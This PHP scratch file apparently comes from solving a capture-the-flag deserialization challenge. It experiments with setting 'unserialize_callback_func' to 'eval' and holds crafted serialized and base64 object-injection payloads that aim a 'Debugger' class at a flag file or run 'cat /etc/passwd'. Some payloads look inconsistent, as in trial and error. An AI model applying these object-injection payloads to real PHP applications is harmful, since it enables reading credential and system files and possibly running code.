<?php

// require_once 'utils.php';
// require_once 'note.php';



ini_set('unserialize_callback_func', 'eval' );
// ini_set('open_basedir','/home/askee');
ini_set('display_errors', '1');

echo strlen('O:4:"exit":1:{s:8:"settings";s:15:"cat /etc/passwd";');
unserialize('O:2:"&&":1:{s:8:"settings";s:15:"cat /etc/passwd";}');


// file_get_contents("flag_8231d477e2a0143f81e5ecb4ab7bb2a5")

// unserialize(base64_decode('Tzo0OiJOb3RlIjozOntzOjI6ImlkIjtpOjE7czo1OiJ0aXRsZSI7czo0OiJtZW93IjtzOjc6ImNvbnRlbnQiO086ODoiRGVidWdnZXIiOjI6e3M6MTg6IgBEZWJ1Z2dlcgB2YXJpYWJsZSI7czoyMDoiL2hvbWUvYXNrZWUvZmxhZy50eHQiO3M6MTg6IgBEZWJ1Z2dlcgBhcmd1bWVudCI7czo0OiJmaWxlIjt9fQ=='));
// unserialize(base64_decode('TzoxOiJYIjoyOntzOjg6InNldHRpbmdzIjtOO3M6MDoiIjtPOjg6IkRlYnVnZ2VyIjoyOntzOjE4OiIARGVidWdnZXIAdmFyaWFibGUiO3M6MjA6Ii9ob21lL2Fza2VlL2ZsYWcudHh0IjtzOjE4OiIARGVidWdnZXIAYXJndW1lbnQiO3M6NDoiZmlsZSI7fX0='));
// unserialize('');



// echo strlen('/flag_8231d477e2a0143f81e5ecb4ab7bb2a5');

// echo base64_encode('O:37:"/flag_8231d477e2a0143f81e5ecb4ab7bb2a5":1:{s:8:"settings";s:15:"cat /etc/passwd";');
